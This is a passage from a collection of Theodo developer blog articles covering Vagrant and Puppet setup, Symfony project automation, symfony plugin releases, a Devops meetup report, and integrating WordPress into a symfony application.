system-related surprises.\n\nInstall Vagrant\n\nMac OS X\n\nFirst download VirtualBox\u00a04\u00a0http://www.virtualbox.org/wiki/Downloads\nThen install the Vagrant gem\n\n\n\nsudo gem install vagrant\n\nDebian/Ubuntu\n\n# Install Ruby, Ruby Gems and Vagrant\r\nsudo apt-get install rubygems\r\nsudo apt-get install ruby-dev\r\nsudo apt-get install build-essential\r\nsudo gem install vagrant\r\n# Add the ruby gems path to your path\r\nPATH=$PATH:/var/lib/gems/1.8/bin\r\n# Download and install VirtualBox\r\necho 'echo \"deb http://download.virtualbox.org/virtualbox/debian maverick contrib\" >> /etc/apt/sources.list' | sudo sh\r\nwget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add -\r\nsudo apt-get update\r\nsudo apt-get install virtualbox-4.0\r\nsudo apt-get install dkms\nYou should now be able to type vagrant in your terminal and see the list of tasks that you can do.\n$ vagrant\r\nTasks:\r\n  vagrant box                        # Commands to manage system boxes\r\n  vagrant destroy                    # Destroy the environment, deleting the created virtual machines\r\n  vagrant halt                       # Halt the running VMs in the environment\r\n  vagrant help [TASK]                # Describe available tasks or one specific task\r\n  vagrant init [box_name] [box_url]  # Initializes the current folder for Vagrant usage\r\n  vagrant package                    # Package a Vagrant environment for distribution\r\n  vagrant provision                  # Rerun the provisioning scripts on a running VM\r\n  vagrant reload                     # Reload the environment, halting it then restarting it.\r\n  vagrant resume                     # Resume a suspended Vagrant environment.\r\n  vagrant ssh                        # SSH into the currently running Vagrant environment.\r\n  vagrant ssh_config                 # outputs .ssh/config valid syntax for connecting to this environment via ssh\r\n  vagrant status                     # Shows the status of the current Vagrant environment.\r\n  vagrant suspend                    # Suspend a running Vagrant environment.\r\n  vagrant up                         # Creates the Vagrant environment\r\n  vagrant version                    # Prints the Vagrant version information\nNow fetch the base Ubuntu Ludic 32 box provided by Vagrant. This make take a few minutes depending on your connection, since it consists in downloading around 700MB\n$ vagrant box add base http://files.vagrantup.com/lucid32.box\nFinally, to avoid permission problems with folder sharing between your host machine and your virtual environment, I highly recommend using NFS instead of VBox, which is the default protocol used by VirtualBox.\n\nOn Mac OS X, you do not need to do anything, NFS is already installed.\nOn Debian/Ubuntu, you just need to install the NFS package:\n\n$ sudo apt-get install nfs-common nfs-kernel-server\nTest on a first project\nI set up a test project so that you can see how it works. Create a new folder called sflive2011vm. We will clone the configuration for our Vagrant Virtual Machine and then clone our actual project inside\n$ cd sflive2011vm\r\n$ git clone git://github.com/fabriceb/sfLive2011vm.git .\r\n$ git clone git://github.com/fabriceb/sfLive2011.git\nNow all you have to do to test the project is\n$ vagrant up\nand after a few minutes, Vagrant will have started a virtual Ubuntu, installed all the packages needed and set up tha machine as described in the Puppet manifest. To verify that everything worked as planned just visit\u00a0http://127.0.0.1:2011/hello/master\nThat\u2019s it!\nUnderstand Vagrant\nLet us now understand more deeply how Vagrant works:\nThe base box\nThe base box is simply a saved hard-disk of a Virtual Machine created with VirtualBox. It can contain anything but it needs at least :\n\nRuby\nVirtualBox guest additions\nPuppet\nChef\n\nto be boot-strapped by Vagrant and then further configured by a Chef recipe or a Puppet manifest\nVagrantfile\nThis is the configuration file of Vagrant. The most useful options are port forwarding, provisioning solution (Puppet or Chef) and eventually NFS\nVagrant::Config.run do |config|\r\n  config.vm.box = \"base\"\r\n  config.vm.forward_port(\"web\", 80, 2011)\r\n  config.vm.provision :puppet\r\n  # config.vm.share_folder(\"v-root\", \"/vagrant\", \".\", :nfs => true)\r\nend\nProvisioning\nThe configuration of your VM is coded using Chef or Puppet. This ensures that you will reproduce exactly the same configuration in all your development VMs AND your production environment. Here is the Puppet manifest used in the example:\nexec { \"apt-get-update\":\r\n  command => \"apt-get update\",\r\n  path => [\"/bin\", \"/usr/bin\"],\r\n}\r\n\r\nPackage {\r\n ensure => installed,\r\n require => Exec[\"apt-get-update\"]\r\n}\r\n\r\nclass lighttpd\r\n{\r\n  package { \"apache2.2-bin\":\r\n    ensure => absent,\r\n  }\r\n\r\n  package { \"lighttpd\":\r\n    ensure => present,\r\n  }\r\n\r\n  service { \"lighttpd\":\r\n    ensure => running,\r\n    require => Package[\"lighttpd\", \"apache2.2-bin\"],\r\n  }\r\n\r\n  notice(\"Installing Lighttpd\")\r\n}\r\n\r\nclass lighttpd-phpmysql-fastcgi inherits lighttpd\r\n{\r\n\r\n  package { \"php5-cgi\":\r\n    ensure => present,\r\n  }\r\n\r\n  package { \"mysql-server\":\r\n    ensure => present,\r\n  }\r\n\r\n  exec { \"lighttpd-enable-mod fastcgi\":\r\n    path    => \"/usr/bin:/usr/sbin:/bin\",\r\n    creates => \"/etc/lighttpd/conf-enabled/10-fastcgi.conf\",\r\n    require =>  Package[\"php5-cgi\"],\r\n  }\r\n\r\n  notice(\"Installing PHP5 CGI and MySQL\")\r\n}\r\n\r\nclass symfony-server inherits lighttpd-phpmysql-fastcgi\r\n{\r\n\r\n  package { [\"php5-cli\", \"php5-sqlite\"]:\r\n    ensure => present,\r\n    notify  => Service[\"lighttpd\"],\r\n  }\r\n\r\n  notice(\"Installing PHP5 CLI and SQLite\")\r\n}\r\n\r\nclass symfony-live-server inherits symfony-server\r\n{\r\n\r\n  file { \"/etc/lighttpd/conf-available/99-hosts.conf\":\r\n    source => \"/vagrant/files/conf/hosts.conf\",\r\n    notify  => Service[\"lighttpd\"],\r\n    require => Package[\"lighttpd\"],\r\n  }\r\n\r\n  exec { \"lighttpd-enable-mod hosts\":\r\n    path => \"/usr/bin:/usr/sbin:/bin\",\r\n    creates => \"/etc/lighttpd/conf-enabled/99-hosts.conf\",\r\n    require => File[\"/etc/lighttpd/conf-available/99-hosts.conf\"],\r\n    notify  => Service[\"lighttpd\"],\r\n  }\r\n\r\n  notice(\"Installing and enabling Hosts file\")\r\n}\r\n\r\ninclude symfony-live-server\r\nnotice(\"Symfony2 server is going live!\")\nTake home message\n\nVagrant is an essential part of the DevOps\u00a0process: it is the solution to developing, testing and deploying in the same environment. It thus ensures a smoother transition of your project from the dev team to the ops team\nVagrant is EASY. And it is compatible with both Chef and Puppet\nVagrant is a must for Mac developers.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA project is never finished, and at Theodo we often have to quickly alter a project, in a small way. The issue is that the time required to having the project ready on a developer\u2019s machine can be greater that the time required to do the the rest! But worse, setting up a project is boring.\nThis is why we decided to automate as much as possible the low added-value aspects of setting up a project.\nThere are usually four aspects to setting up a project:\n\nDependencies\nConfiguration files\nA database\nA web server, configured for the website, including the URL rewriting\n\nDependencies\nIn our case, it usually means only \u201cSymfony, version 1.x\u201d. For Python projects, a pip dependencies file is provided, and running a script will create a virtualenv and install the dependencies: no root access or hunting on the web is needed.\nFor Symfony projects, it\u2019s easy to have all major versions at hand. However, these projects usually require multiple symbolic links to be created, in non-standardized places. Thankfully, we chose to adopt convention over configuration and only one line of configuration is actually needed for mksymlinks to do its magic.\nIf you chose to install Symfony other than in lib/vendor (likely with versions under 1.2), you can of course configure mksymlinks to handle it.\nConfiguration\nThe configuration of a project on the production servers and on the developer\u2019s machines usually differ; database passwords, mail and database servers location, etc. The configuration files are therefore not versioned, only sample versions of them are, designed for a standard development environment.\nA simple script can find the \u201csample\u201d configuration files and create symbolic links (ideal for developers) or copies of these sample files. The developer shouldn\u2019t need to alter these files to setup the project.\nRunning the script will for instance create a symlink from config/databases.yml to config/databases.sample.yml.\nDatabases\nWhile recent versions of Symfony and Doctrine can create a database, older versions and Propel can\u2019t. Also, database users and their credentials still have to be created, and it is really annoying to set them up. We use a simple script which will write a SQL script, and will try to run it using the credentials of ~/.my.cnf.\nAn alternative is to use SQLite, but it can quickly become a limitation for bigger projects.\nThe database is then filled with meaningful and useful fixtures.\nThe web server\nLast but not least, the web server. Frameworks like Ruby on Rails or Django come with their own servers. These are not for production use, but are perfect for developer\u2019s needs: no root access required, instant startup, no configuration\u2026 In the PHP world, nothing similar to be found. However, it is very well possible to configure and start a small server automatically.\nThat\u2019s the job of symfttpd and its command\u00a0spawn: run it and it will configure and start a lighttpd-based server, then tell you where you can view the project, and what applications are present.\nThe scripts handling the sample configuration and database are rather crude and around 50 lines of code; you should be able to write your own in no time if you are too impatient for a proper release of our own.\nLet\u2019s not forget documentation\nWhile all of this works great, nothing replaces an INSTALL file with all the necessary steps, especially the unusual ones. It\u2019s also nice to provide scripts to run all the required commands in one go; run it and your project is ready! (There\u2019s still time to get a nice cup of coffee especially with our new awesome coffee machine.)\nThere is more to come\nOn the same principles, we use some of the tools mentioned above in our continuous integration platform, to be able to add any project in no time.\nSymfttpd with its tools spawn and mksymlinks has been publicly released: https://github.com/laurentb/symfttpd. You can use them to accelerate the deployment of your development environment. As for the small scripts which automate the rest of our needs, we will surely release them in an upcoming post about continuous integration.\u00a0More about it will follow, so be sure to subcribe!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLaurent Bachelier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs promised during the last symfony live conference, I finally release my current work on a Facebook Connect Plugin for symfony. It is inspired by the good sfFacebookPlugin by Jonathan Todd, which has however been unmaintained for quite some time. Since Facebook\u2019s platform is evolving every week and my focus was not on the Facebook platform but on the Facebook Connect functionality, I decided to create this new plugin.\nIt is for the moment VERY beta. It is used in two projects, http://www.allomatch.com which is a symfony 1.0/propel project and another project on symfony 1.2/doctrine. It is therefore compatible with both Doctrine and Propel. However some issues remain concerning 1.0 and 1.2 versions regarding some options, the tasks for example.\nFor the installation, the README is a good start but FAR from complete. I invite you to browse through the code to understand the logic and comment on this post if you have any question regarding installation. This will force me to improve the README.\nI intend to improve the documentation in the very near future, so if you are not in a hurry, please wait. However I have already received dozens of mails concerning the current status, so I release it for those who need to start a project using Facebook Connect right now.\nHere is the link to the plugin:\nhttp://www.symfony-project.org/plugins/sfFacebookConnectPlugin\nAnd here the presentation made at the sflive conference:\nhttp://www.symfony-live.com/pdf/sflive09fr/theodo-symfony-facebook.pdf\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nDecember just started, and with it its usual christmas spirit, Santa Claus, happy children and\u2026. the symfony advent calendar!\nThis year the symfony advent calendar is a collection of articles written by different symfony experts:\nhttp://www.symfony-project.org/blog/2009/12/01/one-more-thing\nand is already available as a book on Amazon!\nhttp://www.amazon.com/exec/obidos/ASIN/2918390178\nI had the chance to contribute and write an article on developing for Facebook with symfony. This was the perfect occasion to finally sit down and write 15 pages on the experience I gathered on this specific subject. I had already collected it in the sfFacebookConnect plugin but it was lacking documentation. Well here it is finally! At least on Amazon and in a few days as part of the new symfony advent calendar.\nEnjoy and do not hesitate to make a critical feedback, the article will be included with the plugin and can still evolve a lot!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYesterday, December 1st, Theodo had the pleasure to host the improvised first Paris Devops meetup in our new office! Samuel Maftoul and Philippe M\u00fcller managed to gather a very interesting and mixed crowd of devs and ops to discuss on the promising ideas that the Devops movement is bringing in the agile develpoment world. Were present:\n\nSergio Simone\nBruno Michel\nVincent Hardion\nClaude Falgui\u00e8re\nLudovic Piot\nAlexandre Rodi\u00e8re\nRapha\u00ebl Pierquin\nPhilippe Muller\nLaurent Bossavit\nSamuel Maftoul\nVermeer Grange\nCyrille Le Clerc\nFran\u00e7ois de Metz\nFabrice Bernhard\n\nIt was also the occasion to ask Laurent Bossavit to sign his book Gestion de projet : Extreme Programming which is our bible here at Theodo, a great honour \nThere were too many subjects and too little time during this first session to really tackle the technologies and ideas behind devops but it was a great occasion to meet diverse people and create a first contact. A very promising start for this new meetup! A big thanks to Samuel Maftoul and Philippe Muller for the initiative and if you want to know more and be informed about the next sessions, join the Paris-devops Google Group.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBienvenue sur le blog de Theodo !\nDepuis 2009 Theodo d\u00e9veloppe des applications web et mobiles sur mesure. Notre \u00e9quipe de d\u00e9veloppeurs est sp\u00e9cialis\u00e9e en Symfony et Angular.js en particulier et plus g\u00e9n\u00e9ralement toutes les technologies de d\u00e9veloppement web opensource. Quoi de plus normal quand on a la philosophie opensource du partage des connaissances de partager \u00e0 son tour ses d\u00e9couvertes. C\u2019est le but de ce blog, o\u00f9 nous partageons r\u00e9guli\u00e8rement les d\u00e9couvertes techniques ou les astuces des d\u00e9veloppeurs Theodo.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tsfEasyGmapPlugin is a very easy to use Google Maps API plugin for symfony, inspired by the Phoogle class\u2026 but better \nA very simple version has been available for a few months but I have now finally released the 1.0 version,  with the following new features :\n\u2013 it is now sf1.2 compatible straight out of the box\n\u2013 it has some unit tests\n\u2013 the GMap constructor now takes an array of parameters, which is much more flexible and also more in the symfony coding spirit (Warning : the modification of the GMap constructor should break your application if you used the prior version of sfEasyGMapPlugin)\n\u2013 there are interesting functions concerning Bounds :\n\u2013 smallest enclosing bound\n\u2013 propel criteria \u201cin bounds\u201d\n\u2013 homothety transformation\n\u2013 zoomOut transformation\n\u2013 there are interesting functions concerning conversion from/to lat/lng to/from Google\u2019s pixel coordinates system. These can be very useful if you want to guess the bounds knowing only the center lat/lng, the zoom level and the map\u2019s width/height in pixels. They involve a few mathematical formulas that were not so straightforward, (since you need to understand how Google\u2019s projection works) so trust me, these functions are valuable, even if they only concern power users.\nI have also developed a few doctrine-specific functions which are unfortunately not available yet because not generic enough. I will try to release them in the next version.\nThe official symfony page is here : http://www.symfony-project.org/plugins/sfEasyGMapPlugin\nPlease feel free to comment on this work in progress !\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat better topic to start this technical blog about symfony than to talk about my experience of integrating WordPress into symfony !\nI was looking for a nice blogging solution for symfony, and all I found was a very simple plugin and a lot of people encouraging me to build my own blog. Even though it is a nice exercise, my philosophy is to not reinvent the wheel. WordPress is surely the best free blogging tool available, so I preferred to spend time integrating it into my symfony application than to create yet another sfVeryEasyBlogPlugin.\nIntegrating WordPress into symfony can be done in three steps :\n\nintegrating the blog into the application and its layout\nmerging the authentification system\nintegrating the blogging information into the symfony application\n\nThere is a wiki page handling the last two steps : http://trac.symfony-project.org/wiki/HowToIntegrateWordPressAndBbPressWithSymfony, written by Michael Nolan but I actually concentrated my efforts on the first step for the moment and that is what I will describe.\nIntegrating WordPress into a symfony application and its layout\nInstall WordPress\n \nWe need to store the wordpress files somewhere, I chose to create a new plugin sfWordpressPlugin and put the whole wordpress into the folder\n\nplugins/sfWordpressPlugin/lib/vendor/wordpress\n\nI then created a symbolic link in the web directory called blog pointing to the wordpress directory. That way I was able to run the WordPress configuration and let it create its database\n\nln -s ../plugins/sfWordpressPlugin/lib/vendor/wordpress web/blog\n\nCreate a blog module\nWe then need a new module, which can be put in the new wordpress plugin and which I called sfWordpress. I enabled it in my frontend application and added the following routing :\n\n\n\r\nblog:\r\n  url:   /blog/*\r\n  param: { module: sfWordpress, action: index }\r\n\n\nCreate an action that executes WordPress\nIt now becomes a little tricky. I want to execute WordPress from inside symfony. The goal is to use output_buffering to send the output to the template. I experienced three difficulties :\n\nsome actions in WordPress output specific headers, such as feed actions, so their output should be sent directly to the browser and not go through the symfony template\nincluding the wordpress files inside of a function and using buffering to store the output seemed like an easy solution, unless WordPress used a lot of global constants\u2026 which is unfortunately the case ! WordPress has some very bad coding habits, they use a dozen of global variable, and some of them have such stupid names as \u201c$name\u201d which means anyone can override them by error (Me for example\u2026)\nthe __() function of WordPress and symfony are conflicting\u2026\n\nI was able to overcome these difficulties, and here is how my action looks like :\n\n/**\r\n * int\u00e9gration de WordPress\r\n *\r\n * @param sfWebRequest $request\r\n * @author fabriceb\r\n * @since Mar 4, 2009 fabriceb\r\n */\r\n public function executeIndex(sfWebRequest $request)\r\n {\r\n   // Don't load symfony's I18N\r\n   $standard_helpers = sfConfig::get('sf_standard_helpers');\r\n   $standard_helpers = array_diff($standard_helpers, array('I18N'));\r\n   sfConfig::set('sf_standard_helpers', $standard_helpers);\r\n\r\n   define('WP_USE_THEMES', true);\r\n   chdir( dirname(__FILE__) . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'lib' . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'wordpress' );\r\n   global $wpdb;\r\n   ob_start();\r\n   require_once( 'wp-blog-header.php' );\r\n   $this->blog = ob_get_contents();\r\n   if (function_exists('is_feed') && is_feed())\r\n   {\r\n     ob_end_flush();\r\n     throw new sfStopException();\r\n   }\r\n   else\r\n   {\r\n     ob_end_clean();\r\n   }\r\n }\n\nAnd I had to hack the wp-blog-header.php file to solve the problem of all the global variables :\n\nrequire_once( dirname(__FILE__) . '/wp-load.php' );\r\n\r\n // @HACK FABRICE\r\n // All variables defined here are considered global by WordPress\r\n $local_global_vars = get_defined_vars();\r\n foreach($local_global_vars as $local_name => $local_value)\r\n {\r\n   $GLOBALS[$local_name] = $local_value;\r\n }\r\n // Don't create new global variables ourselves, and do not overwrite other global variables, for example $name...\r\n unset($local_name, $local_value, $local_global_vars);\r\n // @HACK FABRICE\r\n\r\n wp();\r\n\r\n // @HACK Fabrice\r\n global $posts;\r\n // @HACK Fabrice\r\n\r\n require_once( ABSPATH . WPINC . '/template-loader.php' );\n\nMy only small disappointment for the moment is that I did not solve the I18N conflict, I just avoided it. I will try to come back on this later to fnd a real solution\u2026 using namespaces for example ? \nIntegrate WordPress view in the symfony view\nI created a new theme in my WordPress, based on the default one, which goal was to output only the content of the blog without the layout. It is actually quite easy to do, you just go in each of the php files of the template and you remove all the references to the following functions :\n\nget_header()\nget_footer()\nget_sidebar()\n\nThat way, the output of WordPress stored in the buffer is just the main content stripped out of the layout.\nAfter that, the indexSuccess.php in the sfWordpress module is simple :\n\n< ?php echo $blog ?>\n\nHowever you still want to include WordPress\u2019s header or sidebar in your own layout. To do that I did the changes directly in my layout.php, as for example in the header :\n\n< ?php if (defined('WP_USE_THEMES') && WP_USE_THEMES): ?>\r\n  < ?php get_header(); ?>\r\n< ?php else: ?>\r\n  < ?php include_http_metas() ?>\r\n  < ?php include_metas() ?>\r\n  < ?php include_title() ?>\r\n< ?php endif; ?>\n\nOr for the sidebar :\n\n\r\n  < ?php if (defined('WP_USE_THEMES') && WP_USE_THEMES): ?>\r\n    < ?php get_sidebar(); ?>\r\n  < ?php else : ?>\r\n    < ?php include_component('reference', 'quickList') ?>\r\n  < ?php endif; ?>\r\n\n\nSecure the application\nIt was a big surprise to see that every dynamic WordPress file is actually accessible from the web server. I do not feel at ease with this, and I plan on blocking direct access to any of the files. However for the moment I still see two files that are necessary and I have not yet wrapped inside a symfony action :\n\nwp-comments-post.php which is used to post the comments\nxmlrpc.php which is used for the pingbacks\n\nSo my philosophy for the moment is to trust WordPress for the frontend files, and block access to all the other directories by including the following .htaccess in each of them :\n\n\r\n        AuthUserFile /etc/apache2/.htpasswd\r\n        AuthName \"Admin only\"\r\n        AuthType Basic\r\n        require valid-user\r\n\n\nUrl rewriting\nIf you enable the url rewriting in WordPress there is actually nothing to do, since the symfony routing already routes any /blog/* url to the WordPress action. However you must be very careful about the .htaccess that WordPress automatically generates and which will break everything !\nTherefore I created an empty\n\nplugins/sfWordpressPlugin/lib/vendor/wordpress/.htaccess\n\nowned by root and removed any write access for the user www-data\nConclusion (for the moment)\nMy plan is to publish very soon the work done in a sfWordpressPlugin and work on the next two steps of integration :\n\nMerging authentication systems\n\nThis should be quite easy to do without a hack, since the whole authentication system of WordPress is overridable by a plugin. I think Eric Kittell actually already did it, let us hope it is opensource.\n\nExchange contents between symfony and WordPress\n\nThere are two solutions here, create a schema file for the wordpress database or use the rss file as a web service content provider. Both are interesting.\nPlease feel free to comment on this work in progress\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"}
]